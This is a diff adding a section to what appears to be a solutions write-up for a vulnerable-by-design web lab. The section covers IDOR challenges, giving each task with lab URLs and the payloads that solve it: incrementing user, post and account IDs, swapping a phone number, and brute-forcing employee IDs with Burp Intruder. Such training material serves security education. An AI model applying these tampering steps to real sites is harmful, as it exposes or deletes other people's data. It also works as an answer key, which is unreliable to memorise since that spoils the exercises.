@@ -256,6 +256,86 @@ See if you can schedule the ride without adding money to your wallet by bypassin
 bprice=1000&toll=-500&balance=500
 
 
+--------------------------------------------
+# IDOR and Rate-limiting issues
+
+
+## GET Based IDOR in URL Variant 1
+
+### query:
+http://13.233.245.52/Insecure-Direct-Object-Reference/GET-Based-IDOR-in-URL-Variant-1/bill.php?user_id=1438
+
+### task:
+Check if there's an IDOR vulnerability in the website below. If there is, find out how much user data can a hacker steal with it.
+
+### payload:
+*user_id parameter is vulnerable*
+bill.php?user_id=1439
+
+
+## Post Based IDOR Variant 1
+
+### query:
+phone_num=%2B91-9876543210
+
+### task:
+You were hired as a security expert by an organisation and you found the phone number of an important employee through social hacking. You also found out he was registered on this same website as you. Now use his number (+91-6842097531) and see if you can get his call details.
+
+### payload:
+phone_num=%2B91-6842097531
+
+## GET Based IDOR in URL Variant 2
+
+###query:
+http://13.233.245.52/Insecure-Direct-Object-Reference/GET-Based-IDOR-in-URL-Variant-2/delete-post.php?post_id=931642
+
+### task:
+See if you can delete the posts of other users, apart from yours.
+
+### payload:
+*post_id is vulnerable paramter here*
+*each users id is attached to thier name*
+
+/delete-post.php?post_id=931642
+
+>eg: Bulla928451
+>name: Bulla
+>id: 928451
+
+*to delete this users comment*
+
+/delete-post.php?post_id=928451
+
+## Post Based IDOR in URL Variant 2
+
+### query:
+emp=EMP9D
+
+### task:
+See if you can tamper with the Employee ID and extract salary details of other employees working at ABC Pvt. Ltd.
+
+### payload:
+*burte force '9D' parameter with burp suite intruder*
+
+>eg:
+>emp=EMP6Y
+>emp=EMP3C
+
+
+## Download based IDOR
+
+### query:
+/Download-based/statement.php?accno=4001012392389
+
+### task:
+See if you can download the account statement for any other account numbers, other than yours.
+
+### payload:
+*acc no parameter is vulnerable increase the acc no by 1*
+
+>ie:
+accno=4001012392390
+
 
 
 
